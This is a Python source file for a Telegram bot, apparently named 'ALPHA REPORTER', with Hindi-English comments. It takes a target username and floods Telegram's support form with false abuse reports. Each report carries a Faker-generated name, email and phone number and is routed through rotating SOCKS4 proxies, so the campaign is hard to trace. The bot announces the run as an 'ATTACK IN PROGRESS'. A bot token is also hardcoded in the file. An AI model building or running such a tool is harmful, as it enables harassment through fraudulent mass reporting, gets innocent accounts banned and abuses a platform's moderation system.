import os
import requests
import random
import time
import threading
from faker import Faker
from telegram import Update
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, CallbackContext, ConversationHandler

# --- CONFIG ---
TOKEN = os.getenv("TOKEN", "8648448255:AAFnXq9eLXH9B67W8_im79PTjEyDIW7K6G8")
fake = Faker()
USERNAME_STATE = 1

# --- ADVANCED FILE LOADER ---
def load_alpha_file(filename):
    """Railway ke har folder mein file dhoondne ke liye"""
    possible_paths = [
        filename, 
        f"attached_assets/{filename}", 
        f"bann/{filename}",
        f"bann/attached_assets/{filename}"
    ]
    for path in possible_paths:
        if os.path.exists(path):
            try:
                with open(path, "r", encoding="utf-8") as f:
                    # Sirf un lines ko lo jo khali nahi hain
                    lines = [line.strip() for line in f if line.strip()]
                    if lines:
                        print(f"✅ Found {filename} at: {path}")
                        return lines
            except Exception as e:
                print(f"⚠️ Error reading {path}: {e}")
    return []

# --- CORE REPORT ENGINE ---
def fire_report(payload, proxy=None):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Referer": "https://telegram.org/support"
    }
    proxies = {'http': f'socks4://{proxy}', 'https': f'socks4://{proxy}'} if proxy else None
    try:
        res = requests.post("https://telegram.org/support", data=payload, headers=headers, proxies=proxies, timeout=12)
        return "Thank you" in res.text or res.status_code == 200
    except:
        return False

def report_worker(chat_id, username, bot):
    # Files loading (Donon attached_assets aur main root se)
    reports = load_alpha_file("report.txt")
    proxies = load_alpha_file("STAR.txt") or load_alpha_file("socks4_proxies.txt")
    
    if not reports:
        bot.send_message(chat_id, "❌ **SYSTEM ERROR:** `report.txt` nahi mili ya khali hai!")
        return

    status_msg = bot.send_message(chat_id, f"🛡 **ALPHA ENGINE ONLINE**\nTarget: `@{username}`", parse_mode="Markdown")
    
    success_count = 0
    p_idx = 0
    total_reports = len(reports)

    for i, msg in enumerate(reports):
        # Username replacement
        final_msg = msg.replace("{@username}", f"@{username}").replace("@username", f"@{username}")
        
        payload = {
            "message": final_msg,
            "legal_name": fake.name(),
            "email": f"{fake.user_name()}@{random.choice(['gmail.com', 'yahoo.com', 'outlook.com'])}",
            "phone": '7' + ''.join([str(random.randint(0, 9)) for _ in range(9)]),
            "setln": ""
        }

        current_proxy = proxies[p_idx] if proxies else None
        
        if fire_report(payload, current_proxy):
            success_count += 1
        
        if proxies:
            p_idx = (p_idx + 1) % len(proxies)

        # Update status every 2 reports
        if (i + 1) % 2 == 0 or (i + 1) == total_reports:
            try:
                status_msg.edit_text(
                    f"🛡 **ATTACK IN PROGRESS**\n"
                    f"🎯 Target: `@{username}`\n"
                    f"🌐 Proxy: `{current_proxy if current_proxy else 'Direct'}`\n"
                    f"📊 Status: `{success_count}/{i+1}` sent.",
                    parse_mode="Markdown"
                )
            except: pass
        
        time.sleep(1.8)

    bot.send_message(chat_id, f"✅ **TASK COMPLETED**\nTarget: `@{username}`\nTotal Successful: `{success_count}`")

# --- HANDLERS ---
def start(update, context):
    update.message.reply_text("💀 **ALPHA REPORTER**\nTarget ka username (without @) bhejien:")
    return USERNAME_STATE

def handle_target(update, context):
    username = update.message.text.strip().lstrip('@')
    update.message.reply_text(f"🚀 Sequence started for `@{username}`...")
    threading.Thread(target=report_worker, args=(update.effective_chat.id, username, context.bot)).start()
    return USERNAME_STATE

def main():
    updater = Updater(TOKEN, use_context=True, workers=32)
    dp = updater.dispatcher
    conv = ConversationHandler(
        entry_points=[CommandHandler('start', start)],
        states={USERNAME_STATE: [MessageHandler(Filters.text & ~Filters.command, handle_target)]},
        fallbacks=[]
    )
    dp.add_handler(conv)
    updater.start_polling()
    updater.idle()

if __name__ == "__main__":
    main()
